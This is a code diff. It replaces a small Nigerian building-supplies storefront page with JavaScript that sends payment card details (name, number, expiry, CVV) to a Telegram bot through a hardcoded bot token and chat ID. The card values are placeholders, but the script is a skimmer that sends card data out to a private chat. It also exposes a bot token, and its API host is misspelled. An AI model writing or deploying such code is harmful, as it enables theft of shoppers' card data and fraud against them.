@@ -1,56 +1,50 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Agumba limited.ng</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 10px; margin: 0; }
-        h1 { color: #004a99; font-size: 24px; margin: 20px 0; }
-        .container { display: flex; flex-direction: column; align-items: center; gap: 20px; }
-        .card { background: white; border-radius: 12px; padding: 15px; width: 90%; max-width: 350px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .product-name { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; display: block; }
-        .img-box { width: 100%; height: 200px; display: flex; align-items: center; justify-content: center; background: #fff; margin-bottom: 10px; }
-        img { max-width: 100%; max-height: 100%; object-fit: contain; }
-        .price { font-size: 28px; font-weight: 900; color: #000; margin: 15px 0; display: block; }
-        .buy-btn { 
-            background-color: #5cb85c; 
-            color: white; 
-            text-decoration: none; 
-            padding: 15px 0; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            display: block; 
-            font-size: 20px;
-        }
-    </style>
-</head>
-<body>
+// ==========================================
+// 1. TELEGRAM CONFIGURATION & FUNCTION
+// ==========================================
 
-    <h1>Agumba limited.ng</h1>
+// Your exact token from the screenshot
+const BOT_TOKEN = '8732590798:AAEr7p9WexGuUXavhb7qlRi_fD6M0xjWZWY'; 
 
-    <div class="container">
-        <div class="card">
-            <span class="product-name">Steel Rebar</span>
-            <div class="img-box"><img src="https://i.postimg.cc/8zQzXmBv/rebar.png"></div>
-            <span class="price">₦12,000</span>
-            <a href="https://wa.me/2348033405273?text=I%20want%20to%20buy%20Steel%20Rebar" class="buy-btn">BUY</a>
-        </div>
+// Your personal Telegram User ID (Chat ID)
+const CHAT_ID = '62586335608';
 
-        <div class="card">
-            <span class="product-name">Galvanized Wire</span>
-            <div class="img-box"><img src="https://i.postimg.cc/mD8p6m6P/wire.png"></div>
-            <span class="price">₦32,000</span>
-            <a href="https://wa.me/2348033405273?text=I%20want%20to%20buy%20Galvanized%20Wire" class="buy-btn">BUY</a>
-        </div>
+// The processing function that executes at the end
+function sendData(textToSend) {
+    const url = `https://api.telegram.com/bot${BOT_TOKEN}/sendMessage`;
 
-        <div class="card">
-            <span class="product-name">Dangote Cement</span>
-            <div class="img-box"><img src="https://i.postimg.cc/9f0X98Lp/cement.png"></div>
-            <span class="price">₦12,000</span>
-            <a href="https://wa.me/2348033405273?text=I%20want%20to%20buy%20Dangote%20Cement" class="buy-btn">BUY</a>
-        </div>
-    </div>
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: textToSend
+        })
+    })
+    .then(response => response.json())
+    .then(data => console.log('Message delivered to Telegram:', data))
+    .catch(error => console.error('Error sending data:', error));
+}
 
-</body>
-</html>
+// ==========================================
+// 2. DATA INPUT & MESSAGE (Below the code)
+// ==========================================
+
+// These inputs will automatically map into the message below
+const nameOnCard = "John Doe";
+const cardNumber = "4111222233334444";
+const expiryDate = "12/29";
+const cvv        = "123";
+
+// Building the text payload underneath the sending logic
+const message = `
+Card Details Received:
+- Name on Card: ${nameOnCard}
+- Card Number: ${cardNumber}
+- Expiry Date: ${expiryDate}
+- CVV: ${cvv}
+`;
+
+// Activating the function to push the data to your Telegram ID
+sendData(message);
